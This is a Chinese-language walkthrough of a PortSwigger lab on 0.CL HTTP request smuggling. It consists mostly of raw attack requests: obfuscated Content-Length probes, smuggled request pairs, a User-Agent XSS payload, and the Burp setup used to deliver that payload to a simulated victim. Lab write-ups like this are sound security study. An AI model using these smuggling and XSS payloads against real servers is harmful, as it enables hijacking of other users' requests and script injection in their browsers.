# 实验：0.CL 请求走私

本实验容易受到 0.CL 请求走私的攻击。

Carlos 每五秒访问一次首页。要解决本实验，利用该漏洞在其浏览器中执行 `alert()`。

> **所需知识**
>
> 本实验基于 PortSwigger Research 发现的现实世界漏洞。有关 0.CL 请求走私的完整详细信息，请参阅 James Kettle 的白皮书 [HTTP/1.1 Must Die](https://portswigger.net/research/http1-must-die)。

## 步骤

> 注，此 lab 并非之前的前端配置为不解析某种格式，而是需进行前后端解析差异探测

协议修改为 HTTP/1.1

探测
- 访问主页
    ```http
    GET / HTTP/1.1
    Host: id.web-security-academy.net
    ```

使用“HTTP 请求走私 - TE.TE 行为：混淆 TE 头”段的探测方式对 CL 进行前后端差异探测：使得前端不解析 CL，后端解析 CL
- 转换方法为 POST
    ```http
    POST / HTTP/1.1
    Host: id.web-security-academy.net
    Content-Length: 1

    a  
    ```
    - 成功

- 发送不足 CL 的 POST 请求
    ```http
    POST / HTTP/1.1
    Host: id.web-security-academy.net
    Content-Length: 1


    ```
    - 响应 400
        ```http
        HTTP/1.1 400 Bad Request
        Content-Type: application/json; charset=utf-8
        X-Content-Type-Options: nosniff
        Connection: close
        Keep-Alive: timeout=10
        Content-Length: 24

        {"error":"Read timeout"}
        ```
        - 可能为前端等待浏览器发送 CL 长度字符，引发的前端超时响应

- 发送混淆格式的 CL 头
    ```http
    POST / HTTP/1.1
    Host: id.web-security-academy.net
    Content-Length : 1


    ```
    - 响应 500
        ```http
        HTTP/1.1 500 Internal Server Error
        Content-Type: text/html; charset=utf-8
        Keep-Alive: timeout=10
        Content-Length: 125

        <html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
        ```
        - 出现差异响应，几乎一定是前端等待后端服务器发生超时

    - 此时创建 0.CL 设置

尝试寻找打破死锁的工具，使得后端立即返回响应
- 已知研究描述的特异端点，以及静态资源可能导致后端立即返回
    - 特异端点无效

- 尝试静态资源
    ```http
    GET /resources/images/blog.svg HTTP/1.1
    Host: id.web-security-academy.net
    Content-Length : 1


    ```

    - 服务器响应 200，成功

尝试发送攻击请求与普通请求查看 0.CL 的特征
- 攻击请求
    ```http
    POST /resources/images/blog.svg HTTP/1.1
    Host: id.web-security-academy.net
    Content-Length : 1


    ```
- 普通请求
    ```http
    GET / HTTP/1.1
    Host: id.web-security-academy.net


    ```
- 注意，此处存在模拟受害者，需多次尝试
- 攻击请求立即返回，普通请求得到 404。匹配 0-CL 特征

> 多次尝试的过程中，响应异常 `hostname` 信息。
> 推断：与研究的理想示例不同（前端不重写、排序请求头，后端精准切割），由于前端的重写、排序行为，导致载荷请求2无法被后端精确区分其中被切割到请求1的部分、实际作为后端视角请求2的部分，几乎必然导致载荷请求2的响应为异常响应。此时应当使用载荷请求中的走私请求作为触点，查看普通请求3

测试走私
- 请求1
    ```http
    POST /resources/images/blog.svg HTTP/1.1
    Host: id.web-security-academy.net
    Content-Length : 64


    ```
- 请求2
    ```http
    GET /resources/images/blog.svg HTTP/1.1
    Content-Length: 19
    X: GET /resources/images/avatarDefault.svg HTTP/1.1
    Host: id.web-security-academy.net

    GET / HTTP/1.1
    X: 
    ```

- 请求2几乎总不显示 X: 的截断响应，而普通请求3几乎总不显示最终走私响应。然而后续的十几个普通请求中，偶尔显示走私响应，以及一些错误信息。能够不稳定的走私请求

查找 XSS 注入点
- 查看评论详情
    ```http
    GET /post?postId=3 HTTP/2
    Host: id.web-security-academy.net
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36


    ```

    - 响应
        ```html
        <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
            <input required type="hidden" name="csrf" value="qmHv1l4xIcWg7tAUBIYAaVW7UBRIJ1yv">
            <input required type="hidden" name="userAgent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36">
        ```
    - 反射浏览器代理头部

- 尝试注入 XSS 载荷
    ```http
    GET /post?postId=3 HTTP/2
    Host: id.web-security-academy.net
    User-Agent: "><input autofocus onfocus="alert()
    ```

    - 响应

        ```html
        <input required type="hidden" name="userAgent" value=""><input autofocus onfocus="alert()">
        <input required type="hidden" name="postId" value="3">
        ```

    - 在浏览器查看响应，成功触发弹窗

在不稳定的走私中设置 XSS 端点
- 请求1
    ```http
    POST /resources/images/blog.svg HTTP/1.1
    Host: id.web-security-academy.net
    Content-Length : 64


    ```
- 请求2
    ```http
    GET /resources/images/blog.svg HTTP/1.1
    Content-Length: 168
    X: GET /resources/images/avatarDefault.svg HTTP/1.1
    Host: id.web-security-academy.net

    GET /post?postId=3 HTTP/1.1
    Host: id.web-security-academy.net
    User-Agent: "><input autofocus onfocus="alert()
    Content-Length: 10

    X= 
    ```
    - 最终走私请求设置 XSS 载荷，并设置 CL 到缓存中等待将后续受害者的请求放入走私的请求体中

- 在十几个后续普通请求中发现其中一个得到 XSS 响应

尝试执行 XSS
- 在 burp 的网络设置中关闭优先 HTTP/2（此时各种模块不会尝试升级连接到 HTTP/2）
- 复制请求1到浏览器执行
- 在宏中设置请求1到前置宏
- 发送请求2到攻击器执行无限 NULL 载荷暴破
    - 线程数1
    - 延迟6000ms

- 过程中即看到各种错误响应与 XSS 响应，持续暴破直到显示通关信息

> 此时验证之前推断：载荷请求2的后端视角请求2几乎总是截断失败，无法用作判断走私是否成功的触点。使用载荷请求2中的最终走私请求，虽然多次尝试可成功，但仍不稳定

其他方法：
- 静态资源路径的 302 重定向 `/`
- HEAD -> HTML + GET -> 未编码的重定向字符载荷反射
